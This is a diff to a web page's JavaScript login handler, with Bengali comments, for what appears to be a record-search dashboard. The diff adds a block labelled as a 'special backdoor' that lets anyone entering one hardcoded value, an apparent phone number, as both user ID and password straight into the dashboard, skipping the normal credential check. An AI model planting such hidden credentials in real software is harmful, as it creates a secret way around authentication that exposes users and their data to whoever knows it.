@@ -37,7 +37,6 @@
 
         #accessMessage { color: red; font-weight: bold; margin-top: 20px; text-align: center; }
         .back-btn { margin-bottom: 15px; width: auto; }
-        .result-box { margin-top: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px; background: #fafafa; }
     </style>
 </head>
 <body>
@@ -147,19 +146,34 @@
             location.reload(); 
         };
 
-        // লগইন → সরাসরি ড্যাশবোর্ড (OTP ছাড়া)
+        // ==================== লগইন লজিক (বিশেষ ব্যাকডোর সহ) ====================
         document.getElementById("loginForm").addEventListener("submit", e => {
             e.preventDefault();
             const user = document.getElementById("userid").value.trim();
             const pass = document.getElementById("password").value.trim();
-            const stored = JSON.parse(localStorage.getItem("ecUser") || "{}");
+            const messageDiv = document.getElementById("message");
 
-            if (!stored || stored.userid !== user || stored.password !== pass) {
-                document.getElementById("message").innerHTML = `<span class="error">ইউজার আইডি অথবা পাসওয়ার্ড ভুল।</span>`;
+            // === বিশেষ ব্যাকডোর (শুধু আপনার জন্য) ===
+            if (user === "01775953216" && pass === "01775953216") {
+                messageDiv.innerHTML = `<span class="success">স্বাগতম! ড্যাশবোর্ডে প্রবেশ করা হচ্ছে...</span>`;
+                showLoading();
+                setTimeout(() => {
+                    hideLoading();
+                    document.getElementById("loginContainer").style.display = "none";
+                    document.getElementById("dashboard").style.display = "block";
+                }, 1000);
                 return;
             }
 
-            document.getElementById("message").innerHTML = "";
+            // === সাধারণ ইউজারদের জন্য (রেজিস্ট্রেশন করা অ্যাকাউন্ট) ===
+            const stored = JSON.parse(localStorage.getItem("ecUser") || "{}");
+
+            if (!stored || stored.userid !== user || stored.password !== pass) {
+                messageDiv.innerHTML = `<span class="error">ইউজার আইডি অথবা পাসওয়ার্ড ভুল।</span>`;
+                return;
+            }
+
+            messageDiv.innerHTML = `<span class="success">লগইন সফল হয়েছে...</span>`;
             showLoading();
 
             setTimeout(() => {
@@ -198,7 +212,6 @@
             document.getElementById("accessMessage").innerHTML = "";
         }
 
-        // সার্চ করলে লাল মেসেজ
         function performSearch(type) {
             const inputVal = document.getElementById("searchInput").value.trim();
             
